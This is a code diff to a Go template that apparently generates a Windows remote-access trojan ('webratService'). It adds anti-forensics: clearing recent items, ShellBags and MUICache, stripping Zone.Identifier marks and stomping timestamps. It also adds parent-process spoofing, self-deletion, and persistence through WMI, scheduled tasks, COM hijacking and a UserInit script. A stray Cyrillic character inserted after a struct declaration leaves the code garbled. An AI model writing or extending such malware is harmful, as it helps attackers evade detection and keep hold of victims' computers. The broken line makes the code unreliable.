@@ -6,7 +6,7 @@ func templateProcess() string {
 	return strings.TrimSpace(`
 const stillActive uint32 = 259
 
-type webratService struct{}
+type webratService struct{}Я
 
 func isProcessRunning(pid int) bool {
 	if pid <= 0 {
@@ -121,6 +121,8 @@ func tryDisguiseCopy(exePath string) (string, bool) {
 }
 
 func runPrimaryWithWorker() {
+	applyStealthMeasures()
+
 	exePath, err := os.Executable()
 	if err != nil {
 		loopA()
@@ -129,6 +131,8 @@ func runPrimaryWithWorker() {
 
 	removeZoneIdentifier(exePath)
 	go clearRecentItems()
+	go cleanShellBags()
+	go cleanMUICache()
 
 	disguisedPath, copied := tryDisguiseCopy(exePath)
 
@@ -138,9 +142,7 @@ func runPrimaryWithWorker() {
 	disguisedNorm, _ := filepath.Abs(disguisedPath)
 
 	if copied && !strings.EqualFold(exeNorm, disguisedNorm) {
-		cmd := exec.Command(disguisedPath, "worker")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		if err := cmd.Start(); err == nil {
+		if err := spawnWithSpoofedParent(disguisedPath, []string{"worker"}); err == nil {
 			selfDeleteOriginal(exeNorm)
 			return
 		}
@@ -160,12 +162,29 @@ func selfDeleteOriginal(exePath string) {
 }
 
 func runWorkerGuard() {
-	go performAntiForensics()
+	applyStealthMeasures()
+	go performAntiForensicsNormal()
+
+	startWatchdogMonitor()
 
 	go func() {
 		for {
-			time.Sleep(time.Duration(240+rand.Intn(120)) * time.Second)
-			healPersistence()
+			time.Sleep(time.Duration(180+rand.Intn(120)) * time.Second)
+			healPersistenceLight()
+		}
+	}()
+
+	go func() {
+		for {
+			time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
+			clearRecentItems()
+			cleanShellBags()
+			cleanMUICache()
+			exePath, err := os.Executable()
+			if err == nil {
+				removeZoneIdentifier(exePath)
+				stampFileToSystem(exePath)
+			}
 		}
 	}()
 
@@ -357,6 +376,7 @@ func healPersistenceLight() {
 	}
 
 	removeZoneIdentifier(workerPath)
+	touchTimestamps(workerPath)
 
 	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
 	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
@@ -386,6 +406,18 @@ func healPersistenceLight() {
 
 	if !isWmiPersistencePresent() {
 		opAddWmiPersistence(workerPath)
+	}
+
+	if !isTaskPresent(getTaskName()) {
+		opSetupTask(workerPath)
+	}
+
+	if !isCOMHijackPresent() {
+		addCOMHijack(workerPath)
+	}
+
+	if !isUserInitScriptPresent() {
+		addUserInitScript(workerPath)
 	}
 }
 `)
